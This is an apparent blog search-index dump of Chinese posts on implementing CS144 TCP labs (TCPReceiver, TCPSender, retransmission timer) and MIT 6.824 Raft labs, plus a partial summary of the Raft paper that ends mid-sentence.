如果fin置位，表明收到了第一次挥手，发送方不再发送报文。如果此前收到的报文均已按序排列，则调用end_input()表示设置EOF 否则，将payload交给StreamReassembler _ackno是如何变化的？ 连接建立时，SYN报文会占用1个seqno，因此_ackno应该初始化为1 连接建立后，如果报文中携带的payload可以加入到ByteStream，则_ackno = _ackno + payload.size + unassembled_bytes中加入ByteSteam的size 收到fin报文时，如果前面还有未排好序的报文，则_ackno保持不变。否则，由于fin报文本身占用一个seqno，因此_ackno + 1对应的代码实现如下：void TCPReceiver::segment_received(const TCPSegment &amp;seg) { if (seg.header().syn) { if (_syn) return; _syn = true; isn = seg.header().seqno; _ackno = 1; } if (!_syn) return; bool eof = false; if (seg.header().fin) { _fin = true; eof = true; } size_t index = 0; if (!seg.header().syn) { index = unwrap(seg.header().seqno - 1, isn, _reassembler.stream_out().buffer_size()); } else { index = unwrap(seg.header().seqno, isn, _reassembler.stream_out().buffer_size()); } std::string payload = seg.payload().copy(); size_t stream_size = _reassembler.stream_out().buffer_size(); _reassembler.push_substring(payload, index, eof); _ackno += _reassembler.stream_out().buffer_size() - stream_size; if (_fin &amp;&amp; _reassembler.unassembled_bytes() == 0) _ackno++;}optional&lt;WrappingInt32&gt; TCPReceiver::ackno() const { if (!_syn) { return {}; } else { return wrap(_ackno, isn); }}size_t TCPReceiver::window_size() const { return _capacity - _reassembler.stream_out().buffer_size(); }Lab 3Lab 3的任务是实现TCPSender，按照一定的顺序从ByteStream中读取字节组成TCP segment，并发送到TCPReceiver，根据TCPReceiver响应报文维护发送窗口，保存已发送未确认的TCPsegment并在超时未收到确认时重新发送。如何判断某个segment是否超时TCP周期性调用TCPSender::tick()方法，表示距离上次调用经过的时间。当TCPSender初始化时，指定重发时间RTO的初始值，当某个TCPSegment经过RTO仍未收到来自receiver的确认时，重发第一个未确认的TCPSegment。要求实现一个timer，用作定时器，由TCPSender::tick调用。定时器需要实现如下功能： 当发送一个长度非0的segment时，如果timer此时不在运行，则使用当前的RTO初始化开始计时。 当调用tick，并且timer超时时： 重发最早的未被确认的segment。 如果发送窗口大小不为0： consecutive_retransmissions+1，表示连续出现的重发次数，当重发次数过多时，表明网络状况太差，交给后面的TCPConnection中断连接。 RTO加倍，即指数退避算法，避免由于连续的重发加大网络负载。 使用新的RTO重置定时器，重新开始计时 当收到来自接收方的确认时： 将RTO设置为初始值 如果此时还有未被确认的segment，重置定时器 重置consecutive_transmissions为1 结合以上规则，设计了如下Timer类：class Timer {private: size_t _rto = 0; size_t elapsed_time = 0; bool running = false;public: Timer() {} void enable(size_t rto) { if (!running) { running = true; _rto = rto; } } void disable() { running = false; elapsed_time = 0; } void tick(const size_t ms_since_last_tick) { elapsed_time += ms_since_last_tick; } bool is_timeout() { return elapsed_time &gt;= _rto; } void reset(size_t new_rto = 0) { running = true; _rto = new_rto; elapsed_time = 0; }};对应的TCPSender::tick的实现：//! \\param[in] ms_since_last_tick the number of milliseconds since the last call to this methodvoid TCPSender::tick(const size_t ms_since_last_tick) { if (_segments_unacknowledged.empty()) return; _timer.tick(ms_since_last_tick); if (_timer.is_timeout()) { _segments_out.push(_segments_unacknowledged.front()); if (_window_size &gt; 0) { _retransmission_timeout *= 2; _consecutive_retransmissions++; } _timer.reset(_retransmission_timeout); } }要注意的一点是，在TCPSender类中，构造函数参数retx_timeout类型为uint16_t，而如果Timer中的_rto和elapsed_time也被设计为uint16_t，随着超时次数增大，RTO不断加倍，会引起溢出问题，从而导致在本没有超时的情况下超时，因此将类型统一设置为size_t来规避溢出。TCPSender实现在需要发送segment时，会调用fill_window方法，该方法从ByteStream中尽可能多地读取字节作为segment的载荷。难点在于如何处理发送窗口与序列号的关系。首先，发送窗口大小由接受方指定，为已发送未确认的字节数与剩余可发送的字节数之和。而这个窗口的大小不仅仅针对载荷，SYN和FIN两个报文也各占1字节空间，因此在构建报文时需要考虑SYN和FIN两个标志位。具体地说，应该按照SYN-&gt;payload-&gt;FIN的顺序，依次判断当前发送窗口中是否还有空余位置。其次，当window_size为0时，文档中说”fill window method should act like the window size is one”.原因是在receiver对上一次报文的响应中通知sender接收窗口为0，此时如果sender不再向receiver发送报文，则即使receiver更新了自己的接收窗口，但由于不再接收到新的报文，也不会再向sender发送响应通知这一更新，从而导致二者相互等待的现象出现。但是，如果此时仍有已发送而未确认的报文存在，则无需再次发送。再次，FIN报文的处理。只有当第一次读到stream尾部时，才应当将报文的FIN标志位置为true。如果后续调用fill_window，由于此时ByteStream已经读到了EOF，而此前已经发送过FIN报文，无论是否超时，都不应该由fill_window方法再次发送一次FIN报文。因此需要跟踪FIN报文的状态来避免再次发送。最后，fill_window方法应当何时结束？TCP要求在发送窗口允许的情况下尽可能多地发送报文，而由于网络的限制，payload不能无限制的增长，因此对于超长的报文，需要分段来多次完成发送。当length_in_sequence_space为0时，表明当前的报文发送完毕，方法返回。为了代码简洁，从fill_window中拆出了send_segment方法，代码如下：bool TCPSender::send_segment(TCPSegment &amp;segment, const size_t length) { if (_next_seqno == 0) segment.header().syn = true; segment.header().seqno = wrap(_next_seqno, _isn); if (length &lt; size_t(segment.header().syn)) return false; // MAX_PAYLOAD_SIZE limits payload only. std::string payload = _stream.read(min(TCPConfig::MAX_PAYLOAD_SIZE, length - segment.header().syn)); segment.payload() = Buffer(std::move(payload)); if (!_fin &amp;&amp; _stream.eof() &amp;&amp; length &gt; segment.length_in_sequence_space()) { _fin = true; segment.header().fin = true; } if (segment.length_in_sequence_space() == 0) return false; else { _next_seqno += segment.length_in_sequence_space(); _bytes_in_flight += segment.length_in_sequence_space(); _segments_out.push(segment); _segments_unacknowledged.push(segment); return !_stream.eof(); }}// 长度非0的segment发送后，如果timer未启动，启动timervoid TCPSender::fill_window() { size_t fill_window = 0; // if receiver announce a window size of zero, fill_window method should act like the window_size is one if (_window_size == 0) { if (_bytes_in_flight == 0) { TCPSegment segment; send_segment(segment, 1); } else return; } else { while (true) { TCPSegment segment; if (_window_size &gt; _bytes_in_flight) fill_window = _window_size - _bytes_in_flight; else fill_window = 0; if (!send_segment(segment, fill_window)) break; } } if (!_segments_unacknowledged.empty()) _timer.enable(_retransmission_timeout);}在接收到来自receiver的响应时，调用ack_received方法。TCP采用累计确认，即序列号范围在ackno之前的报文均得到确认。但是，由于网络拥塞等状况的出现，可能会收到若干乱序的确认报文。如果收到的确认号之前已经被确认过，或者确认号大于连接发送过的最大的序列号，该确认报文就应该被丢弃以避免干扰连接。对应的代码如下://! \\param ackno The remote receiver's ackno (acknowledgment number)//! \\param window_size The remote receiver's advertised window sizevoid TCPSender::ack_received(const WrappingInt32 ackno, const uint16_t window_size) { uint64_t _ackno = unwrap(ackno, _isn, _next_seqno); _window_size = window_size; if (_ackno &gt; _next_seqno || _ackno &lt;= _next_seqno - _bytes_in_flight) return; bool reset = false; // look through its collection of outstanding segments and remove any that have now been fully acknowledged while (!_segments_unacknowledged.empty()) { TCPSegment segment = _segments_unacknowledged.front(); if (unwrap(segment.header().seqno, _isn, _next_seqno) + segment.length_in_sequence_space() &lt;= _ackno) { _bytes_in_flight -= segment.length_in_sequence_space(); _segments_unacknowledged.pop(); reset = true; } else break; } if (reset) { _retransmission_timeout = _initial_retransmission_timeout; _consecutive_retransmissions = 0; if (!_segments_unacknowledged.empty()) _timer.reset(_retransmission_timeout); else _timer.disable(); } }TCPSender类中数据成员定义如下：class TCPSender { private: //! our initial sequence number, the number for our SYN. WrappingInt32 _isn; //! outbound queue of segments that the TCPSender wants sent std::queue&lt;TCPSegment&gt; _segments_out{}; std::queue&lt;TCPSegment&gt; _segments_unacknowledged{}; //! retransmission timer for the connection size_t _initial_retransmission_timeout; size_t _retransmission_timeout; //! outgoing stream of bytes that have not yet been sent ByteStream _stream; //! the (absolute) sequence number for the next byte to be sent uint64_t _next_seqno{0}; Timer _timer{}; size_t _window_size = 1; size_t _bytes_in_flight = 0; int _consecutive_retransmissions = 0; bool _fin = false; ...Lab 4Lab4要求实现一个TCPConnection类，主要功能是封装TCPSender和TCPReceiver，构建TCP的有限状态机。这个实验相比于前面几个实验多了很多的细节逻辑，并且很多地方需要修改前面的代码，因此难度相比于前几个大幅提升。TCPConnection各种状态迁移主要是按照如下三幅图来做：在顺利完成了上面几幅图中的状态转换之后，至少可以完成前面的55个测试。由于我没有完美通关本实验，因此不再贴出代码。后记Lab5和Lab6分别是关于链路层协议和路由转发的，对此兴趣不大，因此不再尝试，对计算机网络的学习就此告一段落。下一门打算在CMU 15-445/15-411两门课程中选择。" }, { "title": "6.824 Lab2 Raft Implementation", "url": "/_posts/raft/", "categories": "Distributed Systems", "tags": "Distributed Systems", "date": "2022-11-11 00:00:00 +0000", "snippet": " 6.824 Lab 2: Raft (mit.edu)记录Lab 2A leader electionLab 2A要完成的是初始的leader选举过程，而没有日志的参与。主要需要完成三个部分：定时器，RequestVote和heartBeat.定时器定时器的逻辑很简单，无非是在随机等待时间超时后将状态切换为Candidate，然后开启一个协程开始选举过程，并继续等待下一次时间超时。在La...", "content": " 6.824 Lab 2: Raft (mit.edu)记录Lab 2A leader electionLab 2A要完成的是初始的leader选举过程，而没有日志的参与。主要需要完成三个部分：定时器，RequestVote和heartBeat.定时器定时器的逻辑很简单，无非是在随机等待时间超时后将状态切换为Candidate，然后开启一个协程开始选举过程，并继续等待下一次时间超时。在Lab的提示部分，提到”The easiest way to do this is to create a goroutine with a loop that calls time.Sleep(). Don’t use Go’s time.Timer or time.Ticker, which are difficult to use correctly.”因此采用了time.Sleep来实现计时，但是Raft要求在接收到新的heartbeat后重置定时器，而time.Sleep并没有重置的功能，因此在这里引入了一个新的变量isTimeout。当接收到新的RequestVote或AppendEntries RPC时，将isTimeout设置为false，表示当前的计时器超时后再等待下一轮计时。只有当time.Sleep返回，并且isTimeout为true时，才是真正的超时，将状态设置为Candidate并启动选举过程。当isTimeout为false并且状态为Follower时，将isTimeout重置为true，继续计时。startElection和RequestVote由于Lab 2A中没有引入日志，因此在这里有用的RequestVote的参数只有term和candidateId，分别表示Candidate的任期和id。在startElection中，因为要求Candidate接收到来自新的leader的AppendEntries RPC时将状态转换为Follower，而这一过程可能在startElection的过程中出现，因此首先需要判断一下当前的状态是否为Candidate，如果是，将当前的任期号+1，并设置votedFor = rf.me，从而防止投票给具有相同任期号的其他Candidate。对于集群中的每一个peer，调用sendRequestVote以调用其RequestVote RPC，peer收到RequestVote后，判断任期号是否更新，如果peer发现自己的任期号更大，则返回false和自己的任期号，Candidate在接收到更大的任期号之后将状态立刻设置为Follower，退出选举。否则，如果peer在当前任期内没有给其他的Candidate投票，那么返回true，票数+1.Candidate统计得票数，当票数过半时，将状态转换为Leader，开始发送heartBeat。如果票数没过半，即发生了brain-split时应该怎么处理？论文中解释说在等待一个随机时间后再开始选举，以尽可能减少brain-split再次发生的概率。事实上，由于我们本身具有定时器机制，并且系统中此时并不存在另一个Leader来发送heartbeat，因此只要结束当前的startElection，等待计时器超时后再次启动startElection就可以解决brain-split问题。heartBeat和AppendEntries当前机器成为Leader后，应该一直以固定的时间间隔向系统中所有的peer发送heartBeat，直到发现自己已经不再是Leader为止。因此在循环的开始处，首先判断状态是否为Leader，如果不是Leader直接退出循环。与RequestVote类似，由于Lab 2A不存在日志，因此只需要用到Term和LeaderId两个参数。对于集群中的每一个peer，调用sendAppendEntries以调用AppendEntries RPC。在这里，只有当Leader的任期号小于Follower时才会返回false，因此当reply.Success为false时，直接将状态切换为Follower。对于Follower，当收到有效的AppendEntries，即Leader的任期号不小于自己当前的任期号时，重置isTimeout。Lab 2B logLab 2B中加入了日志，因此相比于2A产生了更多和更复杂的情况。首先，RequestEntries中引入了两个新的参数：LastLogIndex和LastLogTerm，分别是当前日志的末尾元素的下标和末尾元素的任期号，用于实现选举对Candidate日志长度的限制，并且在Candidate成为Leader时，需要将每个peer的nextIndex设置为当前的日志长度，matchIndex设置为0。测试程序和基于Raft的应用使用Start这一接口来执行Command并将其记录到日志中。只有Leader的Start可以被调用，Follower对Start直接返回false。Leader首先将Command加入到自己的日志中，然后依次调用每个peer的AppendEntries来讲Command发送并提交给每个Follower。在这里，Leader需要判断每个peer的nextIndex，如果nextIndex比新插入的Command的下标更小，则说明前面还有没插入的Command，因此需要将从nextIndex之后的日志全部发送出去。如果Follower返回false，则有两种情况：1. Leader落后于系统，将状态转换为Follower。 2. Leader除了发送的这部分日志之外，还有Follower没有记录的日志未发送，因此需要减小nextIndex和matchIndex，具体来说，将nextIndex设为matchIndex，将matchIndex-1，直到matchIndex为0为止。如果发送成功，则将该peer的matchIndex指向当前日志的末尾，nextIndex指向matchIndex+1。在所有的AppendEntries都发送完之后，Leader需要更新自己的commitIndex，具体来说，从当前的commitIndex + 1开始，依次判断与每个peer的matchIndex的大小关系，找到最大的n，使大多数peer的matchIndex &gt;= n，则n为新的commitIndex。而旧的commitIndex到新的commitIndex之间的日志视为已提交，并将其依次发送到applyCh，作为applied，随后更新lastApplied。从上面的描述可以看到，首先Leader的Start过程需要等待所有的发送过程完成，一开始我采用了条件变量，每个用于发送的协程结束后调用wg.Done，而主线程使用wg.Wait阻塞，但是这一机制在某些测试中可能会导致阻塞时间过长，Follower重新选举或在预定的时间内没有成功提交等问题。而如果直接去掉条件变量，又会在另一些测试中由于部分发送协程没有执行完，因此产生不一致或是提交不完全等问题。我在发送结束后加了time.Sleep(10 * time.Millisecond)，在大多数情况下可以通过测试（至少我没有遇到失败情况）。RequestVote的修改比较简单，只需要添加对于Candidate日志长度的比较。对于AppendEntries，如果参数中的Entries长度不为0，就需要从PrevLogIndex开始，找出自己的日志中与Leader对应位置处不一致的日志，将此日志后续的所有日志删除，并将新的日志添加到后面。同时，如果LeaderCommit&gt;commitIndex，将commitIndex更新为LeaderCommit和日志长度二者中的最小值，视为提交部分日志，并将提交后的日志发送给applyCh。经过上面的修改，我产生了一个疑惑：Leader的CommitIndex是根据Follower的返回值来更新的，而Follower的CommitIndex的更新又依赖于LeaderCommit，那么如果仅有一个Start，那么是否日志将永远无法提交？答案显然是否定的。在外部应用调用Start之外，Leader会周期性的发送heartBeat，同样可以携带CommitIndex和日志信息来帮助进行日志提交。在这里需要对heartBeat作出修改，具体来说，除了不需要向日志中插入新的Command之外，其他部分与Start毫无二致。实验给出了一个很有意思的Test，假设存在三台机器，0是Leader，1、2是Follower，让2短暂失去连接，过一段时间后再重新接入，在这个过程中要求系统始终保持一致。实质上这一Test测试的是election restriction的正确性。由于2断联，因此会不断startElection，也就是说currentTerm不断+1，但是0是leader，还在不断地向1和2发送AppendEntries，在2重新变成Follower加入之后，因为0的currentTerm &lt; 2因此0会变成Follower，2成为Candidate，但是由于commitIndex的限制，0和1又不会同意2的选举，因此会出现三个Follower，并且0和1的任期被更新为与2的相同，最终还是只有0和1可以赢得选举，并将日志提交到2上，保持整个系统的一致性。Lab2C: persistenceLab2C要求完成persist和readPersist两个函数，用于保存和恢复服务器的状态 。persist和readPersist中其实已经给出了具体的写法，只要按相同的顺序对Figure2中所示的persistent state（即currentTerm、votedFor和log[]）encode和decode。并在每次persistent state发生变化时调用persist，在Make时调用readPersist恢复。Lab 2C中还增加了对Figure 8的测试，即leader只能通过计数来提交当前任期的日志，而在之前任期产生的日志通过间接提交来完成。具体来说，只有当前任期的日志已经复制到在大多数服务器上时，leader将该日志提交，而在此前的日志也被一并提交。Lab 2D: Log compactionLab 2D要用snapshot来完成日志压缩。当服务器的日志过长时，需要大量时间来完成重放，因此需要定期生成快照来实现压缩。需要实现Snapshot和InstallSnapshot两个函数。Snapshot比较简单，仅用于被上层服务调用，两个参数index和snapshot分别是snapshot对应的下标和保存的快照。如果index对应的下标已经生成过快照，即已经不在内存中，则忽略。如果index超出当前最大的日志，则服务器当前的状态已经包含在参数snapshot中了，创建一个新的log数组，将log[0]的index设置为参数index，将term设置为currentTerm。如果index在当前的log中，则丢弃index之前的部分，将后续的日志作为新的日志，并设置lastIncludedIndex为index。InstallSnapshot用于Leader发现Follower对应的nextIndex已经被丢弃时，将快照发送给Follower。处理过程与AppendEntries比较相似。如果Follower发现Leader的任期落后于自己，则返回自己的Term。否则，判断是否需要修改自己的状态为Follower和重置votedFor。然后，使用与Snapshot相同的规则，丢弃多余的日志，设置lastIncludedIndex。区别在于，Follower在接受了snapshot后，需要通过applyCh来向上层服务发送ApplyMsg。由于的ApplyMsg并不是日志提交，因此并不需要修改lastApplied和commitIndex两个状态，二者只有当leader提交日志后才能够随着LeaderCommit的变化而变化。与InstallSnapshot相对的，在Leader通过BroadCast向所有的服务器发送heartBeat之前，需要首先判断nextIndex对应的日志是否已经被丢弃，如果被丢弃，则要通过InstallSnapshot使对应的Follower与Leader保持一致，在InstallSnapshot成功时，由于要求系统状态不能后退，因此将matchIndex设置为max(lastIncludedIndex, matchIndex)，nextIndex设置为max(matchIndex+1,nextIndex）。我在Lab2D上花费的时间大约为前面三次时间的总和。一方面，由于之前没有考虑到下标的变化，在Lab2D中由于日志压缩的影响，所有的日志下标都要修改为压缩之后的值。另一方面，在2D的测试中，之前的测试用例没有测出来的代码中的潜在问题在此时全面爆发，因此需要从日志中查找细节错误。例如，在TestSnapshotInstallUnreliable2D中遇到了这么一个问题：系统中存在三台服务器，其中0和1变为Candidate，开始选举过程，但是始终发送的RequestVote一直没有响应，其中2可以收到RequestVote请求，但一直无法真正处理该请求。推测是因为系统中出现了死锁导致RequestVote无法获得锁进行处理。通过对每个Lock和Unlock打log，发现由于InstallSnapshot和AppendEntries使用锁保护了applyCh&lt;-ApplyMsg这条语句，而applyCh容量为1，在上层服务没有将管道中的内容取走时，InstallSnapshot和AppendEntries被阻塞在此处，从而也就无法释放锁，而上层服务也被Lock锁住无法从管道中读取，从而导致了系统的死锁。通过将applyCh&lt;-ApplyMsg从临界区中移出，成功解决了死锁问题。我还遇到了一个Liveness问题，即系统长时间无法提供读服务。似乎是由于算法本身的缺陷所造成的。考虑如下场景，系统中存在0，1，2三台服务器产生的集群。初始时0赢得选举成为Leader，向1和2发送了AppendEntries，然后由于网络波动，2没有收到0，而1收到了。此时0的commitIndex为1，而在0发送下一次heartBeat之前，2由于长时间没有收到heartbeat，Term+1，成为Candidate，但是由于2中的日志比较旧，因此无法赢得选举，此时012均成为Follower，term均为2，1先于0成为Candidate，由于1的日志与0的一样新，比2的更新，因此赢得选举，term为3.但是，1中的日志是0在term为1时发送的，由于Raft限制只能提交当前任期的日志，因此在服务没有新的日志写入时，1将会始终无法提交日志。在此期间，如果又有读请求到了节点1，如果直接执行了读请求，则不满足线性一致性，因为状态机的状态依然是旧的（因为0已经提交了该日志，而1没有提交，按照线性一致性的要求，在读到了新的状态后就不能再读到旧的状态）。因此需要首先判断当前term是否提交过日志，如果没有提交过日志，则应该等待当前term提交过日志之后才能处理读请求，而client的读请求得不到满足，也就不会写入新的命令，1依然无法提交日志，从而造成了系统陷入了类似死锁的状态。一种似乎可行的解决方法是在Apply中，如果最后一个日志的term小于当前的term，则写入一个空命令来使leader一并提交先前的日志。我试着实现了这一机制，但是加入之后lab 2D和lab2B的测试都出现了大量的错误。。。。总结我的代码实现在clingfei/6.824 (github.com)中，每个实验都测试了200次，没有出现错误。前前后后花了八九个工作日，最后在11.11完成了Lab 2A~2D，果然单身狗只能写代码（笑）。对并发的理解提高了很多，深刻体会到了Go写并发的优势,debug的耐心也增加了很多。后面争取本学期结束前写完Lab 3和Lab 4。" }, { "title": "Raft--In Search of an Understandable Consensus Algorithm", "url": "/_posts/raft-extended/", "categories": "论文阅读, Distributed Systems", "tags": "Distributed Systems, 论文阅读", "date": "2022-11-11 00:00:00 +0000", "snippet": "Introduction共识算法允许一组机器在存在其中某些机器发生错误的情况下连续地工作，因此在构建可靠的大规模软件系统中起到了重要作用。大部分共识基于Paxos实现，但是Paxos难以理解，并且其结构需要进行复杂的修改来支持实际的系统。因此作者提出了一个新的可以更加方便用于系统构建和教学的共识算法，该算法的核心目的是可理解性：我们是否可以定义一个用于真实系统的共识算法并且其远远比Paxos...", "content": "Introduction共识算法允许一组机器在存在其中某些机器发生错误的情况下连续地工作，因此在构建可靠的大规模软件系统中起到了重要作用。大部分共识基于Paxos实现，但是Paxos难以理解，并且其结构需要进行复杂的修改来支持实际的系统。因此作者提出了一个新的可以更加方便用于系统构建和教学的共识算法，该算法的核心目的是可理解性：我们是否可以定义一个用于真实系统的共识算法并且其远远比Paxos更容易理解？作者提出了Raft这一新的共识算法。作者采用了特定的技术以提高可理解性，包括解耦合（Raft将选举leader、复制日志和安全分离）状态空间缩小（与Paxos类似，Raft减少了不确定度和服务器之间可能不一致的方式）。Raft拥有一些新的特性： 更强的leader：Raft采用比其他共识算法更强的领导权，例如，日志条目只能够从leader发送到其他服务器，这简化了复制的log的管理，并且更加易于理解。 选举leader：raft使用随机化的计时器来选举leader，这仅仅向许多共识算法中需要的heartbeat添加了少量机制，而简单快速地解决了冲突。 成员改变：Raft改变集群中服务器集合的机制使用了一个新的联合共识算法，其中两种不同的配置在转换期间大部分是重叠的，因此集群能够在配置切换时正常运行。Replicated State machines共识算法通常出现在复制状态机的上下文中，在这种方式下，一系列服务器的状态机计算相同状态的完全一致的拷贝，因此能够在其中某些服务器宕机时继续运行。复制状态机用于在分布式系统中解决容错问题。例如，拥有单个集群leader的系统例如GFS HDFS和RAMCloud等，通常使用分离的复制状态机来管理leader选举以及保存必须在leader出错时保存下来的配置信息。复制状态机的例子包括Chubby和ZooKeeper。这里的状态机指的是什么：客户端向Leader发送请求，Leader将请求中的操作记录保存在日志中并扩散到Follower中，并执行client请求的操作，每次操作引起server状态的转换，这些状态迁移过程就组成了状态机的状态迁移过程，状态机相当于server的抽象复制状态机通常使用复制日志来实现。如图1所示。每个服务器保存包含状态机按顺序执行的一系列操作的日志，所以每个状态机处理相同的操作序列。因为状态机是确定的，因此每个状态机计算相同的状态并生成相同的输出序列。保持复制日志的一致是共识算法的工作。服务器的共识模块接收到来自客户端的操作并将其添加到日志中，该共识模块与其他服务器上的共识模块相互通信来保证即使存在某台服务器错误，每个日志最终都包含按照相同顺序排列的相同请求。一旦命令被正确复制，每台服务器的状态机按照日志顺序进行处理，并将输出结果返回给客户端。最终服务器看起来像一台单独的高度可靠的状态机。用于真实系统的共识算法通常有如下性质： 确保所有的非拜占庭条件下的安全性（不会返回不正确的结果给客户端），包括网络延迟、分片、丢包、复制和重排序。 只要大部分服务器是可运行的，并且服务器能够彼此之间以及与客户端通信，就能够正常工作。因此，一个五个服务器组成的经典的集群能够忍受其中任意两台服务器错误。服务器可以停止运行，并可能之后在可靠的存储设备上恢复状态并重新加入集群。 服务器不需要依赖时间戳来确保日志的一致性：错误的时钟和极端情况下的消息延迟在最坏情况下可能造成可用性问题。 在通常情况下，只要大多数服务器对一轮远程过程调用发起响应命令就可以完成，少量的响应缓慢的服务器不会影响整个系统的性能。The Raft consensus algorithmFig 2总结了算法的流程，Fig 3 给出了算法的关键性质。Raft通过首先选择一个leader，然后由leader来管理复制后的日志。leader接收来自客户端的日志条目，在其他服务器上复制日志，并告诉这些服务器什么时候应该将日志保存到自己的状态机中。使用Leader简化了对于复制日志的管理。例如，leader可以决定何时向日志中存入新的条目而不需要与其他服务器进行协商，并且数据流以一种简单的方式从leader流向其他的服务器。leader可以宕机或者与其他服务器断联，然后系统会选举出一个新的leader。leader断联后是如何恢复系统状态的？如何选举出一个新的leader？Leader断联后，Follower在electionTimeout之内没有收到heartbeat，等到electionTimeout耗尽后，将自己的状态切换到Candidate，currentTerm+1，并向所有的server发送RequestVote，如果大部分server认可Candidate，则Candidate将状态切换到Leader，继续向Follower发送AppendEntries，系统继续推进。raft将共识问题分解成三个独立的子问题： leader选举：leader宕机时必须选举出一个新的leader 日志复制：leader必须接收从client发送的日志并在集群中将其复制，并强迫其他日志与自己的日志保持一致。 安全性：Raft的关键的安全特性时Fig 3中描述的状态机安全特性，如果任何服务器将一个特定的日志条目保存到自己的状态机中，那么任何其他的服务器都不能在相同的日志下标处保存一个不同的操作。（也就是说，所有服务器保存的日志记录的顺序应该是一致的，并且在同一个时间点不存在两个不同的操作，从而保证整个系统的一致性）Raft basicsraft集群包括多台服务器，通常是五台，可以容忍两台服务器错误。每台服务器必定处于三种状态之一：leader，follower和candidate。正常情况下，一台服务器作为leader，其他的服务器作为follower。follower是被动的，自己不会发送请求而是仅仅响应leader和candidate的请求。leader处理所有的客户端请求，如果client向follower发送请求，则follower将其重定向到leader。第三个状态candidate用于选举一个新的leader。Fig 4展示了状态之间的转换过程。Raft 将实践划分为任意长度的片段，如Fig 5所示。片段使用连续的整数编号。每个片段开始首先进行选举，一个或多个candidate尝试成为leader。在candidate赢得选举之后，然后在剩余的时间内作为leader来工作。某些情况下选举会导致分开的投票，此时任期以没有leader结束，并立刻开始一个新的任期，重新开始选举。raft确保在任何给定的任期内至多只有一个leader。（什么情况下会选举失败？会不会一直失败？系统如何检测选举失败？如果Candidate收到的VoteGranted没有超过所有server的半数，则选举失败，选举失败可能的情况有：1. 两个Candidate同时发送RequestVote,并且具有相同的Term，因此系统中出现splitvote。2.Candidate的Term太小，被其他server否决。3. 超过半数的server宕机。采用随机化的electionTimeout来尽可能避免splitvote情况，如果Candidate没有成为Leader，则等到下一轮electionTimeout超时或是等到新的Candidate出现）不同的服务器可能在不同的时间观察到状态转移，并且某些情况下服务器可能不会观察到选举。任期在raft中作为逻辑时钟，允许服务器检测过时的信息，例如过时的leader。每个服务器保存当前的任期数，并随着时间单调增加。当前的任期在服务器通信时改变，如果一个服务器的任期数比另一个小，则将其任期数修改为更大的值，如果candidate或者leader发现自己的任期已经过时了，那么立刻切换为follower状态，如果服务器接收到具有过时的任期数的请求，则拒绝这一请求。任期数作为系统的逻辑时钟。不同的服务器各自维护一个任期数，并在通信时检查是否过时，在发现自己的任期数已经过时，则或修改自己的状态，或修改自己的任期数raft服务器使用RPC进行通信，并且基本的共识算法只需要两种类型的RPC，RequestVote RPC在选举时被candidate发起，leader发起AppendEntries RPC来复制日志条目和提供heartbeat。还有一种RPC用来在服务器之间传播快照。如果在一定时间内没有收到RPC的响应，那么将会重发RPC。RPC以并行方式执行以获得最好的性能。Leader electionRaft使用heartbeat机制来触发leader选举。当服务器以follower状态启动。只要服务器能够从leader或candidate收到有效的RPC调用就始终保持在follower状态。leader通过不携带日志条目的AppendEntries周期性向所有的follower发送heartbeat消息，以保证自己的leader状态。如果一个follower在一个周期内没有收到消息，称为选举超时（election timeout），然后这个follower认为没有可用的leader存在并开始选举新的leader。为了启动leader选举，follower首先使自己现在的任期数+1，并切换到candidate状态。然后为自己投票并并行向集群中所有的服务器发送RequestVote RPC。candidate始终保持此状态，直到发生下列情况之一：(A)赢得选举(B)另一个服务器赢得选举(C)一段时间过去后没有leader产生。下面分别讨论三种情况。如果candidate收到来自整个集群中具有相同任期数的服务器的大多数投票，则赢得选举。（其他的服务器是如何知道应该投票的？投票用的RPC是什么？其他的服务器监听RequestVote RPC，Candidate向所有的服务器发送RequestVote请求）每个服务器在一个给定的任期内只能选举至多一个candidate。在FIFO的基础上，大多数规则确保在一个任期内至多一个candidate可以赢得选举（Fig 3中的选举安全性)。一旦candidate赢得选举，则向所有其他的服务器发送heartbeat消息来建立自己的leader地位并阻止进行新一轮选举。在等待投票时，candidate可能从希望成为leader的另一个服务器收到AppendEntries RPC。如果RPC中的任期至少比自己的大，那么candidate认可leader，并将状态修改为follower。如果收到的RPC中的任期比自己的小，则candidate拒绝RPC并继续保留在candidate状态。第三个可能的情况是candidate既不会赢得选举，也不会有其他的candidate赢得选举：如果许多follower在同一时刻成为candidate，投票可能分散以至于没有candidate会赢得大多数投票。此时每个candidate将会超时并通过使任期+1启动新的选举，并发起另一轮RequestVote RPC调用。然而，如果没有额外的操作，可能会无限重复此过程。raft使用随机的选举超时来确保很少出现分离选票并且一旦出现可以很快解决。为了在第一时间防止分离选票，选举超时时间从固定的时间间隔中随机选取。由于不同的服务器具有不同的超时时间，所以大部分情况下只有一台服务器会超时，并且在任何其他的服务器超时前赢得胜利并发送heartbeat。同样的机制用来处理分离选票。每个candidate在选举开始时重新选择其随机化的超时时间，并等待超时时间结束后才能开启下一轮选举。这一机制减少了在新的选举中出现另一次分离选票的可能。Log replication一旦leader选举完成，则开始响应客户端的请求。每个客户端请求包含一个将要被复制状态机执行的操作。leader将这个操作作为新的日志条目添加到自己的日志中，然后并发地调用AppendEntries RPC来通知其他服务器复制这一日志条目。当复制成功完成后，leader将这一日志条目应用到自己的状态机中并将操作的结果返回给客户端。（我的理解是leader在收到请求后，首先记录操作，然后让其他的服务器复制操作，复制完成后才会真正执行客户端请求的操作，并且把操作执行的结果返回给客户端）如果follower宕机或者运行卡顿，或者网络丢包，leader将会无限重复调用AppendEntries（即使leader已经完成执行客户端请求的命令并将执行结果返回给客户端），直到所有的follower最终保存了所有的日志条目。（如果有follower退出怎么办？如果follower加入怎么办？follower加入则leader将所有先前的日志或快照发送给该follower，如果follower退出视为该follower宕机）日志被组织为Fig 6的方式。(什么叫it is safe for that entry to be applied to state machines)每个日志条目保存了一个状态机操作和leader接收到该条目时的任期数，日志条目中的任期数用来检测日志之间是否一致并用来确保Fig 3中的性质(Log Matching)。每个日志条目同时拥有一个整数下标，用来表示在日志中的位置。leader决定何时可以安全地将日志条目加入到状态机，这样的条目被称为已提交（committed）。raft保证已提交的条目时可持续的并且最终被所有可用的状态机执行。一旦创建条目的leader在大多数服务器上复制了这一日志，则该日志就被认为是committed。同时也会提交leader之前的条目以及先前leader创建的条目。leader需要跟踪自己知道的将要被提交的最高的下标，并将该下标包含在将来的AppendEntries 